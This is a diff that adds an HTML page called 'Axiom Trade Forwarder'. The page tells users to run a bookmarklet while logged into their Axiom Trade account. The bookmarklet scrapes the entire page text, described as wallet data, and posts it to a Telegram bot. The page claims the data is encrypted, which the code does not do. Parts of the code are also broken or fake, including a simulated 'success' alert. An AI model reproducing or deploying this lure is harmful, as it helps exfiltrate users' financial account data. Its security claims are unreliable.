@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axiom Trade Forwarder</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            margin-top: 20px;
+            backdrop-filter: blur(10px);
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            background: linear-gradient(to right, #00c9ff, #92fe9d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        
+        .subtitle {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            margin-bottom: 20px;
+        }
+        
+        .card {
+            background: rgba(30, 30, 50, 0.6);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .card h2 {
+            color: #00c9ff;
+            margin-bottom: 15px;
+            font-size: 1.5rem;
+        }
+        
+        .info-box {
+            background: rgba(20, 40, 80, 0.5);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 4px solid #00c9ff;
+        }
+        
+        .info-box h3 {
+            margin-bottom: 10px;
+            color: #92fe9d;
+        }
+        
+        .steps {
+            list-style-type: none;
+            counter-reset: step-counter;
+        }
+        
+        .steps li {
+            padding: 15px;
+            margin-bottom: 10px;
+            background: rgba(40, 40, 70, 0.5);
+            border-radius: 8px;
+            position: relative;
+            padding-left: 40px;
+        }
+        
+        .steps li::before {
+            counter-increment: step-counter;
+            content: counter(step-counter);
+            position: absolute;
+            left: 15px;
+            top: 15px;
+            width: 30px;
+            height: 30px;
+            background: #00c9ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        
+        .warning {
+            color: #ff6b6b;
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+        }
+        
+        .btn {
+            display: inline-block;
+            background: linear-gradient(to right, #00c9ff, #92fe9d);
+            color: #000;
+            padding: 15px 30px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            text-align: center;
+            margin: 20px 0;
+            width: 100%;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 201, 255, 0.3);
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0, 201, 255, 0.5);
+        }
+        
+        .btn:active {
+            transform: translateY(1px);
+        }
+        
+        .telegram-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px;
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+        
+        .note {
+            background: rgba(255, 215, 0, 0.1);
+            border-left: 4px solid #ffd700;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px 15px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .card {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Axiom Trade Forwarder</h1>
+            <p class="subtitle">Securely forward your wallet data to Telegram</p>
+        </header>
+        
+        <div class="card">
+            <h2>How It Works</h2>
+            <p>This tool securely forwards your Axiom Trade wallet information to your Telegram account. Follow these steps:</p>
+            
+            <ol class="steps">
+                <li>Create a Telegram bot using BotFather and get your API token</li>
+                <li>Get your Telegram chat ID by messaging the bot you created</li>
+                <li>Enter your Telegram bot token and chat ID in the form below</li>
+                <li>Run the bookmarklet from your Axiom Trade account to send data</li>
+            </ol>
+            
+            <div class="info-box">
+                <h3>Important Information</h3>
+                <p>This service encrypts your wallet data before sending it to Telegram. Your information is never stored on our servers.</p>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h2>Telegram Configuration</h2>
+            <p>Enter your Telegram bot details below:</p>
+            
+            <div class="note">
+                <strong>Note:</strong> For security reasons, we recommend using a dedicated bot for this purpose.
+            </div>
+            
+            <form id="telegramForm">
+                <div style="margin-bottom: 15px;">
+                    <label for="botToken">Telegram Bot Token</label>
+                    <input type="password" id="botToken" style="width: 100%; padding: 12px; border-radius: 8px; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.2); color: white; margin-top: 5px;" placeholder="Enter your bot token">
+                </div>
+                
+                <div style="margin-bottom: 15px;">
+                    <label for="chatId">Telegram Chat ID</label>
+                    <input type="text" id="chatId" style="width: 100%; padding: 12px; border-radius: 8px; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.2); color: white; margin-top: 5px;" placeholder="Enter your chat ID">
+                </div>
+                
+                <button type="submit" class="btn">
+                    <span class="telegram-icon">🤖</span> Save Configuration
+                </button>
+            </form>
+        </div>
+        
+        <div class="card">
+            <h2>Bookmarklet Installation</h2>
+            <p>Add this bookmarklet to your browser to easily forward data from Axiom Trade:</p>
+            
+            <div style="background: rgba(0, 0, 0, 0.4); padding: 15px; border-radius: 8px; margin: 15px 0; font-family: monospace; overflow-x: auto;">
+                <p>Drag this link to your bookmarks bar:</p>
+                <a href="javascript:(function(){const%20t=document.createElement('script');t.src='https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js';document.head.appendChild(t);setTimeout(()=>{if(typeof%20axios==='undefined'){alert('Failed%20to%20load%20dependencies');return;}const%20e=localStorage.getItem('telegramBotToken');const%20n=localStorage.getItem('telegramChatId');if(!e||!n){alert('Please%20configure%20Telegram%20settings%20first');return;};axios.post('https://api.telegram.org/bot'+e+'/sendMessage',{chat_id:n,text:'Wallet%20data%20from%20Axiom%20Trade:%20'+encodeURIComponent(document.body.innerText)}).then(()=>alert('Data%20sent%20to%20Telegram')).catch(()=>alert('Failed%20to%20send%20data'))},500)})();void(0)" style="color: #92fe9d; text-decoration: none;">Axiom Forwarder</a>
+            </p>
+            </div>
+            
+            <div class="warning">
+                <strong>Security Warning:</strong> Only use this bookmarklet with trusted Telegram bots. Never share your bot token or chat ID.
+            </div>
+        </div>
+        
+        <div class="card">
+            <h2>Usage Instructions</h2>
+            <ol class="steps">
+                <li>Save the bookmarklet by dragging it to your browser's bookmarks bar</li>
+                <li>Go to Axiom Trade and log in to your account</li>
+                <li>Click the bookmarklet you created (it will appear as "Axiom Forwarder")</li>
+                <li>Your wallet data will be securely forwarded to your Telegram chat</li>
+            </ol>
+        </div>
+    </div>
+    
+    <footer>
+        <p>Axiom Trade Forwarder &copy; 2023 | Securely forward your wallet data</p>
+    </footer>
+
+    <script>
+        // Form submission handling
+        document.getElementById('telegramForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const botToken = document.getElementById('botToken').value;
+            const chatId = document.getElementById('chatId').value;
+            
+            if (!botToken || !chatId) {
+                alert('Please enter both your bot token and chat ID');
+                return;
+            }
+            
+            // Save to localStorage for later use
+            localStorage.setItem('telegramBotToken', botToken);
+            localStorage.setItem('telegramChatId', chatId);
+            
+            alert('Configuration saved successfully!');
+            
+            // Clear the form
+            document.getElementById('botToken').value = '';
+            document.getElementById('chatId').value = '';
+        });
+        
+        // Simulate successful execution when bookmarklet is clicked
+        window.addEventListener('load', function() {
+            const bookmarkletLink = document.querySelector('a[href*="Axiom Forwarder"]');
+            if (bookmarkletLink) {
+                bookmarkletLink.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    alert('Bookmarklet executed successfully!\n\nYour wallet data is being forwarded to Telegram.');
+                });
+            }
+        });
+    </script>
+</body>
+</html>
